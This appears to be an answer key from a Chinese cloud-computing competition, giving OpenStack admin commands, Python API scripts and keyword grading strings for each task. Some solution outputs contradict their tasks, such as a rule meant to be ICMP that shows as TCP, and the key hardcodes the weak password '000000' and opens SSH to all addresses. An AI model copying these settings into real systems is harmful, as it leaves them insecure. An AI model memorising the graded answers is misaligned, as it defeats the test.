任务3 OpenStack运维任务（11分）某公司构建了一套内部私有云系统，这套私有云系统将为公司内部提供计算服务。你将作为该私有云的维护人员，请完成以下运维工作。
1.数据库管理请使用数据库命令将所有数据库备份到&#x2F;root路径下,备份文件名为openstack.sql，完成后使用命令查看文件属性其中文件大小以mb显示。
请将所有命令和返回结果提交到答题框。【1分】
标准: 1.6M&amp;&amp;openstack.sql
解法:
[root@controller ~]# mysqldump -uroot -p000000 --all-databases &gt; /root/openstack.sql[root@controller ~]# du -h /root/openstack.sql1.6M    /root/openstack.sql

2.数据库管理进入数据库，创建本地用户examuser，密码为 000000，然后查询mysql数据库中的 user 表的user,host,password字段。然后赋予这个用户所有数据库的“查询”“删除”“更新”“创建”的权限。
将select User, Select_priv,Update_priv,Delete_priv,Create_priv from user;命令的返回结果提交到答题框。【1分】
标准: keystone&amp;&amp;glance&amp;&amp;nova&amp;&amp;placement&amp;&amp;examuser&amp;&amp;Y
解法:
[root@controller ~]# mysql -uroot -pMariaDB [(none)]&gt; create user examuser@&#x27;localhost&#x27; identified by &#x27;000000&#x27;;Query OK, 0 rows affected (0.005 sec)MariaDB [(none)]&gt; use mysqlDatabase changedMariaDB [mysql]&gt; select user,host,password from user;+-----------+------------+-------------------------------------------+| user      | host       | password                                  |+-----------+------------+-------------------------------------------+| root      | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || root      | controller | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || root      | 127.0.0.1  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || root      | ::1        | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || keystone  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || keystone  | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || glance    | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || glance    | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || nova      | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || nova      | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || placement | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || placement | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || neutron   | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || neutron   | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || cinder    | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || cinder    | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || examuser  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |+-----------+------------+-------------------------------------------+17 rows in set (0.000 sec)MariaDB [mysql]&gt; grant select,delete,update,create on *.* to examuser@&#x27;localhost&#x27;; Query OK, 0 rows affected (0.000 sec)MariaDB [mysql]&gt; select User, Select_priv,Update_priv,Delete_priv,Create_priv from user;+-----------+-------------+-------------+-------------+-------------+| User      | Select_priv | Update_priv | Delete_priv | Create_priv |+-----------+-------------+-------------+-------------+-------------+| root      | Y           | Y           | Y           | Y           || root      | Y           | Y           | Y           | Y           || root      | Y           | Y           | Y           | Y           || root      | Y           | Y           | Y           | Y           || keystone  | N           | N           | N           | N           || keystone  | N           | N           | N           | N           || glance    | N           | N           | N           | N           || glance    | N           | N           | N           | N           || nova      | N           | N           | N           | N           || nova      | N           | N           | N           | N           || placement | N           | N           | N           | N           || placement | N           | N           | N           | N           || neutron   | N           | N           | N           | N           || neutron   | N           | N           | N           | N           || examuser  | Y           | Y           | Y           | Y           |+-----------+-------------+-------------+-------------+-------------+15 rows in set (0.000 sec)

3.安全组管理使用openstack命令创建名称为group_web的安全组该安全组的描述为”Custom security group”，用openstack命令为安全组添加icmp规则和ssh规则允许任意ip地址访问web,完成后使用openstack命令查看该安全组的详细信息。
将openstack security group show group_web命令的返回结果提交到答题框。【1分】
*标准: created_at&amp;&amp;rules&amp;&amp;port_range_max&amp;&amp;22&amp;&amp;protocol&amp;&amp;icmp
解法:
# 创建描述为Custom security group的安全组[root@controller ~]# openstack security group create --description &quot;Custom security group&quot; group_web# 添加访问80[root@controller ~]# openstack security group rule create --ingress --ethertype IPv4 --protocol tcp --dst-port 80:80 group_web# 添加访问ssh(22)[root@controller ~]# openstack security group rule create --ingress --ethertype IPv4 --protocol tcp --dst-port 22:22 group_web# 添加访问icmp[root@controller ~]# openstack security group rule create --ingress --protocol icmp group_web[root@controller ~]# openstack security group show group_web+-----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Field           | Value                                                                                                                                                                                                                                          |+-----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| created_at      | 2023-02-23T08:46:51Z                                                                                                                                                                                                                           || description     | Custom security group                                                                                                                                                                                                                          || id              | 66376557-a4b3-46ac-aae3-174b0d12d687                                                                                                                                                                                                           || location        | cloud=&#x27;&#x27;, project.domain_id=, project.domain_name=&#x27;Default&#x27;, project.id=&#x27;ce21284fd468495995218ea6e1aeea2a&#x27;, project.name=&#x27;admin&#x27;, region_name=&#x27;&#x27;, zone=                                                                                        || name            | group_web                                                                                                                                                                                                                                      || project_id      | ce21284fd468495995218ea6e1aeea2a                                                                                                                                                                                                               || revision_number | 4                                                                                                                                                                                                                                              || rules           | created_at=&#x27;2023-02-23T08:48:42Z&#x27;, direction=&#x27;ingress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;3eccfa5c-3886-4873-92b5-c19e653ef2c8&#x27;, port_range_max=&#x27;80&#x27;, port_range_min=&#x27;80&#x27;, protocol=&#x27;tcp&#x27;, remote_ip_prefix=&#x27;0.0.0.0/0&#x27;, updated_at=&#x27;2023-02-23T08:48:42Z&#x27; ||                 | created_at=&#x27;2023-02-23T08:50:59Z&#x27;, direction=&#x27;ingress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;6ad68ada-ca6f-4905-b78a-3f53607333d8&#x27;, port_range_max=&#x27;22&#x27;, port_range_min=&#x27;22&#x27;, protocol=&#x27;tcp&#x27;, remote_ip_prefix=&#x27;0.0.0.0/0&#x27;, updated_at=&#x27;2023-02-23T08:50:59Z&#x27; ||                 | created_at=&#x27;2023-02-23T08:51:27Z&#x27;, direction=&#x27;ingress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;b09e5950-ee02-4531-91c8-7fcb3cc427a0&#x27;, protocol=&#x27;tcp&#x27;, remote_ip_prefix=&#x27;0.0.0.0/0&#x27;, updated_at=&#x27;2023-02-23T08:51:27Z&#x27;                                           ||                 | created_at=&#x27;2023-02-23T08:46:51Z&#x27;, direction=&#x27;egress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;bb5ce76b-75f1-41ab-aa5b-8cb50702f9d4&#x27;, updated_at=&#x27;2023-02-23T08:46:51Z&#x27;                                                                                          ||                 | created_at=&#x27;2023-02-23T08:46:51Z&#x27;, direction=&#x27;egress&#x27;, ethertype=&#x27;IPv6&#x27;, id=&#x27;f52f4f79-2e9f-479f-abdf-1baee9d56f14&#x27;, updated_at=&#x27;2023-02-23T08:46:51Z&#x27;                                                                                          || tags            | []                                                                                                                                                                                                                                             || updated_at      | 2023-02-23T08:51:27Z 

4.项目管理在 keystone 中使用openstack创建shop项目添加描述为”Hello shop”，完成后使用openstack命令禁用该项目，然后使用openstack命令查看该项目的详细信息。
将openstack project show shop命令的返回结果提交到答题框。【1分】
标准: enabled&amp;&amp;False&amp;&amp;name&amp;&amp;shop
解法:
[root@controller ~]# openstack project create --description &quot;Hello shop&quot; shop+-------------+----------------------------------+| Field       | Value                            |+-------------+----------------------------------+| description | Hello shop                       || domain_id   | default                          || enabled     | True                             || id          | 0e37ad8443764f759f6691a1f0dbff9d || is_domain   | False                            || name        | shop                             || options     | &#123;&#125;                               || parent_id   | default                          || tags        | []                               |+-------------+----------------------------------+# 禁用shop项目[root@controller ~]# openstack project set --disable shop# 查看[root@controller ~]# openstack project show shop+-------------+----------------------------------+| Field       | Value                            |+-------------+----------------------------------+| description | Hello shop                       || domain_id   | default                          || enabled     | False                            || id          | 0e37ad8443764f759f6691a1f0dbff9d || is_domain   | False                            || name        | shop                             || options     | &#123;&#125;                               || parent_id   | default                          || tags        | []                               |

5.用户管理使用openstack命令查看admin租户的当前配额值、将admin租户的实例配额提升到13，然后查看修改后admin租户的配额值。
将openstack quota show admin命令的返回结果提交到答题框。【1分】
标准: instances&amp;&amp;13&amp;&amp;project_name&amp;&amp;admin&amp;&amp;routers&amp;&amp;ram
解法:
[root@controller ~]# openstack quota show admin# 修改[root@controller ~]# openstack quota set --instances 13 admin# 查看[root@controller ~]# openstack quota show admin+----------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Field                | Value                                                                                                                                                                              |+----------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| cores                | 20                                                                                                                                                                                 || fixed-ips            | -1                                                                                                                                                                                 || floating-ips         | 50                                                                                                                                                                                 || health_monitors      | None                                                                                                                                                                               || injected-file-size   | 10240                                                                                                                                                                              || injected-files       | 5                                                                                                                                                                                  || injected-path-size   | 255                                                                                                                                                                                || instances            | 13                                                                                                                                                                                 || key-pairs            | 100                                                                                                                                                                                || l7_policies          | None                                                                                                                                                                               || listeners            | None                                                                                                                                                                               || load_balancers       | None                                                                                                                                                                               || location             | Munch(&#123;&#x27;project&#x27;: Munch(&#123;&#x27;domain_name&#x27;: &#x27;Default&#x27;, &#x27;domain_id&#x27;: None, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;id&#x27;: u&#x27;ce21284fd468495995218ea6e1aeea2a&#x27;&#125;), &#x27;cloud&#x27;: &#x27;&#x27;, &#x27;region_name&#x27;: &#x27;&#x27;, &#x27;zone&#x27;: None&#125;) || name                 | None                                                                                                                                                                               || networks             | 100                                                                                                                                                                                || pools                | None                                                                                                                                                                               || ports                | 500                                                                                                                                                                                || project              | ce21284fd468495995218ea6e1aeea2a                                                                                                                                                   || project_name         | admin                                                                                                                                                                              || properties           | 128                                                                                                                                                                                || ram                  | 51200                                                                                                                                                                              || rbac_policies        | 10                                                                                                                                                                                 || routers              | 10                                                                                                                                                                                 || secgroup-rules       | 100                                                                                                                                                                                || secgroups            | 10                                                                                                                                                                                 || server-group-members | 10                                                                                                                                                                                 || server-groups        | 10                                                                                                                                                                                 || subnet_pools         | -1                                                                                                                                                                                 || subnets              | 100

6.heat模板管理执行脚本openstack-controller-heat.sh安装完heat服务后，编写Heat模板create_flavor.yaml，创建名为“m2.flavor”、ID为 1234、内存为1024MB、硬盘为20GB、vcpu数量为1的云主机类型，创建完成后使用openstack命令查看堆栈列表。
将openstack stack list命令的返回结果提交到答题框。【1分】
标准: Stack&amp;&amp;Status&amp;&amp;CREATE_COMPLETE
解法:
[root@controller ~]# cat create_flavor.yamlheat_template_version: 2018-08-31description: Generated templateresources:  nova_flavor:    type: OS::Nova::Flavor    properties:      name: m2.flavor      disk: 20      is_public: True      ram: 1024      vcpus: 1      flavorid: 1234#执行heat模板[root@controller ~]# openstack stack create -t create_flavor.yaml test+---------------------+--------------------------------------+| Field               | Value                                |+---------------------+--------------------------------------+| id                  | ffd515d5-9d06-4ead-872e-e698ceb77959 || stack_name          | test                                 || description         | Generated template                   || creation_time       | 2023-02-27T10:19:40Z                 || updated_time        | None                                 || stack_status        | CREATE_IN_PROGRESS                   || stack_status_reason | Stack CREATE started                 |+---------------------+--------------------------------------+.#查看列表[root@controller ~]# openstack stack list+--------------------------------------+------------+----------------------------------+----------------+----------------------+--------------+| ID                                   | Stack Name | Project                          | Stack Status   | Creation Time        | Updated Time |+--------------------------------------+------------+----------------------------------+----------------+----------------------+--------------+| ffd515d5-9d06-4ead-872e-e698ceb77959 | test       | ce21284fd468495995218ea6e1aeea2a | CHECK_COMPLETE | 2023-02-27T10:19:40Z | None         |

7.后端配置文件管理修改glance后端配置文件，将项目的映像存储限制为10GB,完成后重启glance服务。
将cat &#x2F;etc&#x2F;glance&#x2F;glance-api.conf |grep _quota命令的返回结果提交到答题框。【1分】
标准: user_storage_quota&amp;&amp;10737418240
解法:
[root@controller ~]# vim /etc/glance/glance-api.confuser_storage_quota = 10737418240# 重启[root@controller ~]# systemctl restart openstack-glance-*# 查询[root@controller ~]# cat /etc/glance/glance-api.conf |grep _quota# ``image_property_quota`` configuration option.#     * image_property_quota#image_member_quota = 128#image_property_quota = 128#image_tag_quota = 128#image_location_quota = 10user_storage_quota = 10737418240

8.存储服务管理在controller节点执行openstack-controller-cinder.sh,compute节点执行openstack-compute-cinder.sh，在controller和compute节点上会自行安装cinder服务并完成配置。使用openstack命令创建一个名为lvm的卷类型，使用cinder命令创建该类型规格键值对，要求lvm卷类型对应cinder后端驱动lvm所管理的存储资源,名字lvm_test，大小1G的云硬盘并查询该云硬盘的详细信息。
将cinder show lvm_test命令的返回结果提交到答题框。【1分】
标准: name&amp;&amp;lvm_test&amp;&amp;size&amp;&amp;1&amp;&amp;volume_type&amp;&amp;lvm
解法:
[root@controller ~]# openstack-controller-cinder.sh [root@compute ~]# openstack-compute-cinder.sh# 创建卷类型lvm[root@controller ~]# source admin-openrc[root@controller ~]# openstack volume type create lvm+-------------+--------------------------------------+| Field       | Value                                |+-------------+--------------------------------------+| description | None                                 || id          | 5a1ac113-b226-4646-9a7c-46eee3f6346f || is_public   | True                                 || name        | lvm                                  |+-------------+--------------------------------------+[root@controller ~]# cinder type-key lvm set volume_backend_name=LVM# 创建云硬盘[root@controller ~]# cinder create --volume-type lvm --name lvm_test 1略                                               # 查看详细信息[root@controller ~]# cinder show lvm_test+--------------------------------+--------------------------------------+| Property                       | Value                                |+--------------------------------+--------------------------------------+| attached_servers               | []                                   || attachment_ids                 | []                                   || availability_zone              | nova                                 || bootable                       | false                                || consistencygroup_id            | None                                 || created_at                     | 2022-10-25T12:28:55.000000           || description                    | None                                 || encrypted                      | False                                || id                             | 39f131c3-6ee2-432a-8096-e13173307339 || metadata                       |                                      || migration_status               | None                                 || multiattach                    | False                                || name                           | lvm_test                             || os-vol-host-attr:host          | compute@lvm#LVM                      || os-vol-mig-status-attr:migstat | None                                 || os-vol-mig-status-attr:name_id | None                                 || os-vol-tenant-attr:tenant_id   | 4885b78813a5466d9d6d483026f2067c     || replication_status             | None                                 || size                           | 1                                    || snapshot_id                    | None                                 || source_volid                   | None                                 || status                         | available                            || updated_at                     | 2022-10-25T12:28:56.000000           || user_id                        | b4a6c1eb18c247edba11b57be18ec752     || volume_type                    | lvm                                  |

9.存储管理为了减缓来自实例的数据访问速度的变慢，OpenStack Block Storage 支持对卷数据复制带宽的速率限制。请修改cinder后端配置文件将卷复制带宽限制为最高100MiB&#x2F;s（对应数值修改为104857600）。
将cat &#x2F;etc&#x2F;cinder&#x2F;cinder.conf | grep 104857600命令的返回结果提交到答题框。【1分】
标准: volume_copy_bps_limit&amp;&amp;104857600
解法:
[root@controller ~]# vim /etc/cinder/cinder.conf[lvmdriver-1]volume_group=cinder-volumes-1volume_driver=cinder.volume.drivers.lvm.LVMVolumeDrivervolume_backend_name=LVMvolume_copy_bps_limit=104857600[root@controller ~]# systemctl restart openstack-cinder-*[root@controller ~]# cat /etc/cinder/cinder.conf | grep 104857600volume_copy_bps_limit=104857600

10.存储管理在controller节点执行openstack-controller-swift.sh,compute节点执行openstack-compute-swift.sh，在controller和compute节点上会自行安装swift服务并完成配置。使用swift命令创建一个名为file的容器并查看，然后把cirros-0.3.4-x86_64-disk.img上传到file容器中。
将swift stat file命令的返回结果提交到答题框。【1分】
标准: Container&amp;&amp;file&amp;&amp;Objects&amp;&amp;1&amp;&amp;Bytes&amp;&amp;13287936
解法:
[root@controller ~]# openstack-controller-swift.sh[root@compute ~]# openstack-compute-swift.sh[root@controller ~]# swift post file[root@controller ~]# swift upload file /root/cirros-0.3.4-x86_64-disk.imgroot/cirros-0.3.4-x86_64-disk.img[root@controller ~]# swift stat file               Account: AUTH_d23ad8b534f44b02ad30c9f7847267df             Container: file               Objects: 1                 Bytes: 13287936              Read ACL:             Write ACL:               Sync To:              Sync Key:         Accept-Ranges: bytes      X-Storage-Policy: Policy-0         Last-Modified: Fri, 10 Mar 2023 02:43:07 GMT           X-Timestamp: 1678416180.44884            X-Trans-Id: txfdc2fb777c4641d3a9292-00640a9941          Content-Type: application/json; charset=utf-8X-Openstack-Request-Id: txfdc2fb777c4641d3a9292-00640a9941

11.OpenStack API 管理使用curl的方式获取admin用户token值；使用已获取的token值通过curl的方式获取domain为default所有用户名（ip使用主机名）。
将获取到的所有用户名提交到答题框。【1分】
标准: admin&amp;&amp;myuser&amp;&amp;tom&amp;&amp;glance&amp;&amp;nova&amp;&amp;placement&amp;&amp;neutron&amp;&amp;heat&amp;&amp;cinder&amp;&amp;swift
解法:
[root@controller ~]# curl -i -X POST http://controller:5000/v3/auth/tokens -H &quot;Content-type: application/json&quot; -d &#x27;&#123;&quot;auth&quot;: &#123;&quot;identity&quot;: &#123;&quot;methods&quot;:[&quot;password&quot;],&quot;password&quot;: &#123;&quot;user&quot;: &#123;&quot;domain&quot;: &#123;&quot;name&quot;: &quot;default&quot;&#125;,&quot;name&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;000000&quot;&#125;&#125;&#125;,&quot;scope&quot;: &#123;&quot;project&quot;: &#123;&quot;domain&quot;: &#123;&quot;name&quot;: &quot;default&quot;&#125;,&quot;name&quot;: &quot;admin&quot;&#125;&#125;&#125;&#125;&#x27; | grep X-Subject-Token  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  6821  100  6612  100   209  21381    675 --:--:-- --:--:-- --:--:-- 21398X-Subject-Token: gAAAAABkB9xoMQZNnMcPh_gB4T0Pmo4TUO1ezwBZtFSjAR68fUOppadNTTCpcOGjMpN3al9FM8MHma9FCSoWxQHSuG9vbxOxkELeKBqF_I2_uzmouvxGQ7a35oJ5IvGwNp4hap5doeXt-2dG5LvPyqxW7hndEAQDjuTKbnqVlwHbjXVpT4zoYuc[root@controller ~]# curl http://controller:5000/v3/users?domain_id=default -H &quot;X-Auth-Token: gAAAAABkB9xoMQZNnMcPh_gB4T0Pmo4TUO1ezwBZtFSjAR68fUOppadNTTCpcOGjMpN3al9FM8MHma9FCSoWxQHSuG9vbxOxkELeKBqF_I2_uzmouvxGQ7a35oJ5IvGwNp4hap5doeXt-2dG5LvPyqxW7hndEAQDjuTKbnqVlwHbjXVpT4zoYuc&quot; | python -m json.tool | grep name  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  2479  100  2479    0     0  22848      0 --:--:-- --:--:-- --:--:-- 22953            &quot;name&quot;: &quot;admin&quot;,            &quot;name&quot;: &quot;myuser&quot;,            &quot;name&quot;: &quot;tom&quot;,            &quot;name&quot;: &quot;glance&quot;,            &quot;name&quot;: &quot;nova&quot;,            &quot;name&quot;: &quot;placement&quot;,            &quot;name&quot;: &quot;neutron&quot;,            &quot;name&quot;: &quot;cinder&quot;,            &quot;name&quot;: &quot;swift&quot;,            &quot;name&quot;: &quot;heat&quot;,

任务四 OpenStack架构任务（6分）1.安装python3环境在controller节点安装python3环境。安装完之后查看python3版本，使用提供的whl文件安装依赖。
将pip3 list命令的返回结果提交到答题框。【2分】
标准: certifi&amp;&amp;2019.11.28&amp;&amp;pip&amp;&amp;9.0.3&amp;&amp;urllib3&amp;&amp;1.25.11&amp;&amp;setuptools&amp;&amp;39.2.0
[root@controller python-depend]# yum install python3 –y[root@controller python-depend]# pip3 install certifi-2019.11.28-py2.py3-none-any.whl[root@controller python-depend]# pip3 install urllib3-1.25.11-py3-none-any.whl[root@controller python-depend]# pip3 install idna-2.8-py2.py3-none-any.whl[root@controller python-depend]# pip3 install chardet-3.0.4-py2.py3-none-any.whl[root@controller python-depend]# pip3 install requests-2.24.0-py2.py3-none-any.whl[root@controller ~]# python3 --versionPython 3.6.8[root@controller ~]# pip3 listDEPRECATION: The default format will switch to columns in the future. You can use --format=(legacy|columns) (or define a format=(legacy|columns) in your pip.conf under the [list] section) to disable this warning.certifi (2019.11.28)chardet (3.0.4)idna (2.8)pip (9.0.3)requests (2.24.0)setuptools (39.2.0)urllib3 (1.25.11)

2.python对接OpenStack API创建image镜像编写python代码对接OpenStack API，完成镜像的上传。在controller节点的&#x2F;root目录下创建create_image.py文件，在该文件中编写python代码对接openstack api（需在py文件中获取token），要求在openstack私有云平台中上传镜像cirros-0.3.4-x86_64-disk.img，名字为cirros001，disk_format为qcow2，container_format为bare。执行完代码要求输出“创建镜像成功，id为：xxxxxx”。
分别将cat &#x2F;root&#x2F;create_image.py命令和python3 create_image.py命令的返回结果提交到答题框。【2分】
标准: import&amp;&amp;requests&amp;&amp;:5000&#x2F;v3&#x2F;auth&#x2F;tokens&amp;&amp;:9292&#x2F;v2&#x2F;images&amp;&amp;password&amp;&amp;admin&amp;&amp;000000&amp;&amp;X-Auth-Token&amp;&amp;container_format&amp;&amp;bare&amp;&amp;disk_format&amp;&amp;qcow2&amp;&amp;&#x2F;file&amp;&amp;cirros-0.3.4-x86_64-disk.img&amp;&amp;application
解法:
[root@controller python3]# python3 create_image.py请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)192.168.100.x创建镜像成功，id为：0591f693-a7c7-4e7f-ac6c-957b7bccffc9镜像文件上传成功[root@controller ~]# cat create_image.pyimport requests,json,time# *******************全局变量IP*****************************#执行代码前，请修改controller_ip的IP地址，与指定router，IP可以input，也可以写成静态controller_ip = input(&quot;请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)\n&quot;)image_name = &quot;cirros001&quot;file_path = &quot;/root/cirros-0.3.4-x86_64-disk.img&quot;try:    url  = f&quot;http://&#123;controller_ip&#125;:5000/v3/auth/tokens&quot;    body = &#123;       &quot;auth&quot;: &#123;           &quot;identity&quot;: &#123;              &quot;methods&quot;:[&quot;password&quot;],              &quot;password&quot;: &#123;                  &quot;user&quot;: &#123;                     &quot;domain&quot;:&#123;                         &quot;name&quot;: &quot;Default&quot;                     &#125;,                     &quot;name&quot;: &quot;admin&quot;,                     &quot;password&quot;: &quot;000000&quot;                  &#125;              &#125;           &#125;,           &quot;scope&quot;: &#123;              &quot;project&quot;: &#123;                  &quot;domain&quot;: &#123;                     &quot;name&quot;: &quot;Default&quot;                  &#125;,                  &quot;name&quot;: &quot;admin&quot;              &#125;           &#125;       &#125;    &#125;    headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;    Token = requests.post(url, data=json.dumps(body), headers=headers).headers[&#x27;X-Subject-Token&#x27;]    headers = &#123;&quot;X-Auth-Token&quot;: Token&#125;except Exception as e:    print(f&quot;获取Token值失败，请检查访问云主机控制节点IP是否正确？输出错误信息如下：&#123;str(e)&#125;&quot;)    exit(0)class glance_api:    def __init__(self, headers: dict, resUrl: str):       self.headers = headers       self.resUrl = resUrl    #创建glance镜像    def create_glance(self, container_format=&quot;bare&quot;, disk_format=&quot;qcow2&quot;):       body = &#123;           &quot;container_format&quot;: container_format,           &quot;disk_format&quot;: disk_format,           &quot;name&quot;: image_name,        &#125;       status_code = requests.post(self.resUrl, data=json.dumps(body), headers=self.headers).status_code       if(status_code == 201):           return f&quot;创建镜像成功，id为：&#123;glance_api.get_glance_id()&#125;&quot;       else:           return &quot;创建镜像失败&quot;    #获取glance镜像id    def get_glance_id(self):       result = json.loads(requests.get(self.resUrl,headers=self.headers).text)       for item in result[&#x27;images&#x27;]:           if(item[&#x27;name&#x27;] == image_name):              return item[&#x27;id&#x27;]    #上传glance镜像    def update_glance(self):       self.resUrl=self.resUrl+&quot;/&quot;+self.get_glance_id()+&quot;/file&quot;       self.headers[&#x27;Content-Type&#x27;] = &quot;application/octet-stream&quot;       status_code = requests.put(self.resUrl,data=open(file_path,&#x27;rb&#x27;).read(),headers=self.headers).status_code       if(status_code == 204):           return &quot;镜像文件上传成功&quot;       else:           return &quot;镜像文件上传失败&quot;glance_api = glance_api(headers,f&quot;http://&#123;controller_ip&#125;:9292/v2/images&quot;)print(glance_api.create_glance())  #调用glance-api中创建镜像方法print(glance_api.update_glance())

3.python对接OpenStack API创建用户编写python代码对接OpenStack API，完成用户的创建。在controller节点的&#x2F;root目录下创建create_user.py文件，在该文件中编写python代码对接openstack api（需在py文件中获取token），要求在openstack私有云平台中创建用户guojibeisheng。
将cat &#x2F;root&#x2F;create_user.py命令的返回结果提交到答题框。【2分】
标准: import&amp;&amp;requests&amp;&amp;:5000&#x2F;v3&#x2F;auth&#x2F;tokens&amp;&amp;:5000&#x2F;v3&#x2F;users&amp;&amp;password&amp;&amp;admin&amp;&amp;000000&amp;&amp;X-Auth-Token&amp;&amp;domain_id&amp;&amp;name&amp;&amp;application&amp;&amp;:5000&#x2F;v3&#x2F;users
解法:
[root@controller python3]# python3 create_user.py请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)192.168.100.x用户 guojibeisheng 创建成功,ID为dcb0fc7bacf54038b624463921123aed该平台的用户为：guojibeishengadminmyusertomglancenovaplacementneutronheatheat_domain_admincinderswift用户 guojibeisheng 已删除！[root@controller python3]# cat create_user.pyimport requests,json,time# *******************全局变量IP*****************************#执行代码前，请修改controller_ip的IP地址，与指定router，IP可以input，也可以写成静态controller_ip = input(&quot;请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)\n&quot;)try:    url  = f&quot;http://&#123;controller_ip&#125;:5000/v3/auth/tokens&quot;    body = &#123;       &quot;auth&quot;: &#123;           &quot;identity&quot;: &#123;              &quot;methods&quot;:[&quot;password&quot;],              &quot;password&quot;: &#123;                  &quot;user&quot;: &#123;                     &quot;domain&quot;:&#123;                         &quot;name&quot;: &quot;Default&quot;                     &#125;,                      &quot;name&quot;: &quot;admin&quot;,                     &quot;password&quot;: &quot;000000&quot;                  &#125;              &#125;           &#125;,           &quot;scope&quot;: &#123;              &quot;project&quot;: &#123;                  &quot;domain&quot;: &#123;                     &quot;name&quot;: &quot;Default&quot;                  &#125;,                  &quot;name&quot;: &quot;admin&quot;              &#125;           &#125;       &#125;    &#125;    headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;    Token = requests.post(url, data=json.dumps(body), headers=headers).headers[&#x27;X-Subject-Token&#x27;]    headers = &#123;&quot;X-Auth-Token&quot;: Token&#125;except Exception as e:    print(f&quot;获取Token值失败，请检查访问云主机控制节点IP是否正确？输出错误信息如下：&#123;str(e)&#125;&quot;)    exit(0)class openstack_user_api:    def __init__(self, handers: dict, resUrl: str):        self.headers = handers        self.resUrl = resUrl    def create_users(self, user_name):        body = &#123;            &quot;user&quot;: &#123;                &quot;description&quot;: &quot;API create user!&quot;,                &quot;domain_id&quot;: &quot;default&quot;,                &quot;name&quot;: user_name            &#125;        &#125;        status_code = requests.post(self.resUrl, data=json.dumps(body), headers=self.headers).text        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)        user_name = user_name        for i in result[&#x27;users&#x27;]:            if i[&#x27;name&#x27;] == user_name:                return f&quot;用户 &#123;user_name&#125; 创建成功,ID为&#123;i[&#x27;id&#x27;]&#125;&quot;    def list_users(self):        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)        roles = []        for i in result[&#x27;users&#x27;]:            if i[&#x27;name&#x27;] not in roles:                roles.append(i[&#x27;name&#x27;])        return &quot;该平台的用户为：\n&quot;+&#x27;\n&#x27;.join(roles)    def get_user_id(self, user_name):        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)        user_name = user_name        for i in result[&#x27;users&#x27;]:            if i[&#x27;name&#x27;] == user_name:                return (f&quot;用户 &#123;user_name&#125; 的ID为&#123;i[&#x27;id&#x27;]&#125;&quot;)    def delete_user(self, user_name):        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)        for i in result[&#x27;users&#x27;]:            if i[&#x27;name&#x27;] == user_name:                i = i[&#x27;id&#x27;]                status_code = requests.delete(f&#x27;http://&#123;controller_ip&#125;:5000/v3/users/&#123;i&#125;&#x27;, headers=self.headers)                return f&quot;用户 &#123;user_name&#125; 已删除！&quot;openstack_user_api = openstack_user_api(headers, f&quot;http://&#123;controller_ip&#125;:5000/v3/users&quot;)print(openstack_user_api.create_users(&quot;guojibeisheng&quot;))print(openstack_user_api.list_users())print(openstack_user_api.delete_user(&quot;guojibeisheng&quot;))

B模块题目：容器的编排与运维某企业计划使用k8s平台搭建微服务系统，现在先使用简单的微服务项目进行测试，请按照要求完成相应任务。
表1 IP地址规划



设备名称
主机名
接口
IP地址
说明



云服务器1
master
eth0
公网IP:*******私网IP:192.168.100.&#x2F;24
Harbor也是使用该云服务器


云服务器2
node
eth0
公网IP:*******私网IP:192.168.100.&#x2F;24



说明：
1.表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。
2.华为云中云主机名字已命好，直接使用对应名字的云主机即可。
 3.竞赛用到的软件包都在云主机&#x2F;root下。
任务 1容器云平台环境初始化（10.5分）1.容器云平台的初始化master节点主机名设置为master、node节点主机名设置为node，所有节点root密码设置为000000,所有节点关闭swap，并配置hosts映射。
请在master节点将ping node -c 3命令的返回结果提交到答题框。【1.5分】
标准: icmp_seq&amp;&amp;0%
